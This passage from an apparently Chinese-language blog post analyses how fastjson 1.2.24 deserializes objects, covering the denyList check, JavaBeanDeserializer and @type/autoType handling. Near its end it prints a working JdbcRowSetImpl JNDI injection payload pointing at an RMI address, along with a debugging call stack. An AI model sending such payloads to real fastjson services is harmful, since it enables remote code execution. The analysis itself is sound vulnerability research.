            &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;annotation&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;null&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
                &lt;span class=&quot;nc&quot;&gt;Class&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;lt;?&amp;gt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;mappingTo&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;annotation&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;mappingTo&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;();&lt;/span&gt;
                &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;mappingTo&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;Void&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;class&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
                    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;getDeserializer&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;mappingTo&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;mappingTo&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;
                &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
            &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
        &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;c1&quot;&gt;//判断是否是泛型相关的接口的实例，至于什么是泛型接口的实例，咱也不知道&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;type&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;instanceof&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;WildcardType&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;||&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;type&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;instanceof&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;TypeVariable&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;||&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;type&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;instanceof&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;ParameterizedType&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;derializer&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;derializers&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;get&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;clazz&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;
        &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;

        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;derializer&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;null&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
            &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;derializer&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;c1&quot;&gt;//反序列化的类是否在denyList中&lt;/span&gt;
        &lt;span class=&quot;nc&quot;&gt;String&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;className&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;clazz&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;getName&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;();&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;className&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;className&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;replace&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;sc&quot;&gt;'$'&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;sc&quot;&gt;'.'&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;denyList&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;length&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;++&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
            &lt;span class=&quot;nc&quot;&gt;String&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;deny&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;denyList&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;];&lt;/span&gt;
            &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;className&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;startsWith&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;deny&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;))&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
                &lt;span class=&quot;k&quot;&gt;throw&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;JSONException&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;parser deny : &quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;className&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;
            &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
        &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;之后还会根据一些情况进行匹配，在所有匹配均不成功后，就会创建一个新的deserializer&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/CitrusIce/blog_pic/master/image-20200801155439336.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;createJavaBeanDeserializer里，会根据asmEnable分两种情况去创建并返回一个JavaBeanDeserializer&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/CitrusIce/blog_pic/master/image-20200801175636270.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;如果目标class的父类中有非public的成员变量，则asmEnable为false，除此之外还有许多条件，如果不成立则asmEnable都为false&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/CitrusIce/blog_pic/master/image-20200801171446495.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;先跟进asm为false的情况，直接new一个JavaBeanDeserializer&lt;/p&gt;

&lt;h2 id=&quot;javabeandeserializer&quot;&gt;JavaBeanDeserializer&lt;/h2&gt;

&lt;div class=&quot;language-java highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;    &lt;span class=&quot;c1&quot;&gt;//其中定义的一些成员变量&lt;/span&gt;
	&lt;span class=&quot;kd&quot;&gt;private&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;final&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;FieldDeserializer&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;[]&lt;/span&gt;   &lt;span class=&quot;n&quot;&gt;fieldDeserializers&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;kd&quot;&gt;protected&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;final&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;FieldDeserializer&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;[]&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;sortedFieldDeserializers&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;kd&quot;&gt;protected&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;final&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;Class&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;lt;?&amp;gt;&lt;/span&gt;            &lt;span class=&quot;n&quot;&gt;clazz&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;kd&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;final&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;JavaBeanInfo&lt;/span&gt;           &lt;span class=&quot;n&quot;&gt;beanInfo&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;kd&quot;&gt;private&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;ConcurrentMap&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;nc&quot;&gt;String&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;Object&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;extraFieldDeserializers&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;com.alibaba.fastjson.util.JavaBeanInfo#build 获取了目标类所生命的成员变量，方法，构造方法&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/CitrusIce/blog_pic/master/image-20200801162230691.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;最后返回一个JavaBeanInfo类&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/CitrusIce/blog_pic/master/image-20200801162539536.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;在JavaBeanInfo的构造方法中，除了一些基本的初始化，还会讲成员变量进行排序，生成一个sortedFields数组，不知道为什么要另外弄一个sortedFields&lt;/p&gt;

&lt;div class=&quot;language-java highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kd&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;JavaBeanInfo&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nc&quot;&gt;Class&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;lt;?&amp;gt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;clazz&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;//&lt;/span&gt;
                        &lt;span class=&quot;nc&quot;&gt;Class&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;lt;?&amp;gt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;builderClass&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;//&lt;/span&gt;
                        &lt;span class=&quot;nc&quot;&gt;Constructor&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;lt;?&amp;gt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;defaultConstructor&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;//&lt;/span&gt;
                        &lt;span class=&quot;nc&quot;&gt;Constructor&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;lt;?&amp;gt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;creatorConstructor&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;//&lt;/span&gt;
                        &lt;span class=&quot;nc&quot;&gt;Method&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;factoryMethod&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;//&lt;/span&gt;
                        &lt;span class=&quot;nc&quot;&gt;Method&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;buildMethod&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;//&lt;/span&gt;
                        &lt;span class=&quot;nc&quot;&gt;JSONType&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;jsonType&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;//&lt;/span&gt;
                        &lt;span class=&quot;nc&quot;&gt;List&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;nc&quot;&gt;FieldInfo&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;fieldList&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;){&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;this&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;clazz&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;clazz&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;this&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;builderClass&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;builderClass&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;this&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;defaultConstructor&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;defaultConstructor&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;this&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;creatorConstructor&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;creatorConstructor&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;this&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;factoryMethod&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;factoryMethod&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;this&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;parserFeatures&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;TypeUtils&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;getParserFeatures&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;clazz&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;this&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;buildMethod&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;buildMethod&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt;

    &lt;span class=&quot;o&quot;&gt;....&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;省略&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.....&lt;/span&gt;

        &lt;span class=&quot;n&quot;&gt;fields&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;FieldInfo&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;fieldList&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;size&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;()];&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;fieldList&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;toArray&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;fields&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;

        &lt;span class=&quot;nc&quot;&gt;FieldInfo&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;[]&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;sortedFields&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;FieldInfo&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;fields&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;length&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;];&lt;/span&gt;
        &lt;span class=&quot;nc&quot;&gt;System&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;arraycopy&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;fields&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;sortedFields&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;fields&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;length&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;
        &lt;span class=&quot;nc&quot;&gt;Arrays&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;sort&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sortedFields&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;

    &lt;span class=&quot;o&quot;&gt;....&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;省略&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.....&lt;/span&gt;
   
    &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;在JavaBeanDeserializer的构造函数中把刚刚返回的javaBeanInfo中的sortedFields和fields放到sortedFieldDeserializers和fieldDeserializers中&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/CitrusIce/blog_pic/master/image-20200801170946844.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;至此deserializer创建完成，在创建好deserializer后讲其放入自己的deserializers表中，然后开始进行反序列化&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/CitrusIce/blog_pic/master/image-20200801172125235.png&quot; alt=&quot;&quot; /&gt;
fastjson-1.2.24-sources.jar!/com/alibaba/fastjson/parser/deserializer/JavaBeanDeserializer.java:349&lt;/p&gt;

&lt;p&gt;从这里开始按照上文提到的sortedFieldDeserializers的顺序进行扫描，并解析对应字段中的值&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/CitrusIce/blog_pic/master/image-20200801172503527.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;当找到对于字段相同，内容类型不同的，进一步进行解析，这里可以看到fastjson会对key值做判断，如果key值等于$ref或@type则会有特殊的处理&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/CitrusIce/blog_pic/master/image-20200801172650015.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/CitrusIce/blog_pic/master/image-20200801172727278.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;之后继续跟进会来到这里com.alibaba.fastjson.parser.DefaultJSONParser#parse(java.lang.Object)&lt;/p&gt;

&lt;p&gt;判断当前指向的符号，如果是”{“则创建一个JSONObject继续解析&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/CitrusIce/blog_pic/master/image-20200801174009759.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;当作为JSONObject继续解析时，同样会对key做判断，如果是@type则会获取类名并加载&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/CitrusIce/blog_pic/master/image-20200801173758418.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;com.alibaba.fastjson.util.TypeUtils#loadClass(java.lang.String, java.lang.ClassLoader)&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/CitrusIce/blog_pic/master/image-20200801173855503.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;之后会根据clazz获取deserializer进行反序列化&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/CitrusIce/blog_pic/master/image-20200801174629869.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;用asm来生成处理类的情况：&lt;/p&gt;

&lt;p&gt;也就是当asmEnable为true的情况&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/CitrusIce/blog_pic/master/image-20200801180314902.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;截一个代码随便看看，如果想看到摄功能成的处理类得抓出字节码然后反编译，感觉有点麻烦，所以就不弄了&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/CitrusIce/blog_pic/master/image-20200801202503290.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;为什么要有autotype功能&quot;&gt;为什么要有autoType功能&lt;/h2&gt;

&lt;p&gt;在分析组件的时候就在想如果没有autotype好像也没什么所谓，于是也搜了下我的疑问&lt;/p&gt;

&lt;p&gt;https://github.com/alibaba/fastjson/issues/3218&lt;/p&gt;

&lt;p&gt;当反序列化一个类包含了一个接口或者抽象类的时候，使用fastjson进行序列化的时候会将原来的类型抹去，只保留接口，使反序列化之后无法拿到原来的类型信息，加入autotype则可以指定类型，保留类型信息&lt;/p&gt;

&lt;h2 id=&quot;遇到的问题&quot;&gt;遇到的问题&lt;/h2&gt;

&lt;p&gt;测试的时候找了两个payload，大体都一样，只不过第一个payload比第二个多了反序列化java.lang.Class类的部分，导致第一个payload打不成功&lt;/p&gt;

&lt;p&gt;使用payload1&lt;/p&gt;

&lt;div class=&quot;language-java highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nc&quot;&gt;String&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;jsonString&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;{\&quot;name\&quot;:{\&quot;@type\&quot;:\&quot;java.lang.Class\&quot;,\&quot;val\&quot;:\&quot;com.sun.rowset.JdbcRowSetImpl\&quot;},\&quot;f\&quot;:{\&quot;@type\&quot;:\&quot;com.sun.rowset.JdbcRowSetImpl\&quot;,\&quot;dataSourceName\&quot;:\&quot;rmi://127.0.0.1:1099/adas\&quot;,\&quot;autoCommit\&quot;:true}}&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;会报Caused by: java.lang.ArrayIndexOutOfBoundsException: -1&lt;/p&gt;

&lt;p&gt;调用栈&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;popContext:1256, DefaultJSONParser (com.alibaba.fastjson.parser)
parseObject:358, DefaultJSONParser (com.alibaba.fastjson.parser)
parse:1327, DefaultJSONParser (com.alibaba.fastjson.parser)
parse:1293, DefaultJSONParser (com.alibaba.fastjson.parser)
parseExtra:1490, DefaultJSONParser (com.alibaba.fastjson.parser)
parseField:766, JavaBeanDeserializer (com.alibaba.fastjson.parser.deserializer)
deserialze:600, JavaBeanDeserializer (com.alibaba.fastjson.parser.deserializer)
deserialze:188, JavaBeanDeserializer (com.alibaba.fastjson.parser.deserializer)
deserialze:184, JavaBeanDeserializer (com.alibaba.fastjson.parser.deserializer)
parseObject:639, DefaultJSONParser (com.alibaba.fastjson.parser)
parseObject:339, JSON (com.alibaba.fastjson)
parseObject:243, JSON (com.alibaba.fastjson)
parseObject:456, JSON (com.alibaba.fastjson)
main:41, test (test)
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;看了一下，是因为执行这条语句是contextArrayIndex为0导致的&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/CitrusIce/blog_pic/master/image-20200801205641550.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

